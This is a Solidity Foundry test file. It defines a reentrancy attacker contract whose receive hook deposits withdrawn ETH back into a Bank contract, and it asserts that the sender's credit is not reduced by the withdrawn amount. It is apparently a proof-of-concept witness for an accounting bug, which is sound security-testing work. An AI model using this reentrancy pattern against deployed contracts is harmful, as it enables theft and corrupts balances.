pragma solidity ^0.8.13;
import "forge-std/Test.sol";
import "../Bank.sol";

// Attacker contract that reenters Bank by depositing the withdrawn ETH back.
contract Reenterer {
    Bank public immutable bank;
    constructor(Bank _bank) {
        bank = _bank;
    }
    receive() external payable {
        // Reenter and deposit back all received ETH
        bank.deposit{value: msg.value}();
    }
}

contract BankTest is Test {          
    Bank immutable bank;
    
    constructor() {
        // deploying a Bank contract
        address bank_deployer = address(0xBEEF);
        vm.prank(bank_deployer);
        bank = new Bank();
    }
    
    
    function test_withdraw_sender_credit_violation() public {

        Reenterer attacker = new Reenterer(bank);
        vm.deal(address(attacker), 2 ether);
        vm.prank(address(attacker));
        bank.deposit{value: 1 ether}();

        uint256 amount = 1 ether;
        address sender = address(attacker);
        
        uint256 credit_senderBefore = bank.credits(sender);

        vm.prank(sender);
        bank.withdraw(amount); // should not revert
	
        uint256 credit_senderAfter = bank.credits(sender);

        assertNotEq(credit_senderBefore - amount, credit_senderAfter, "sender credit decreased by amount");
    }
}
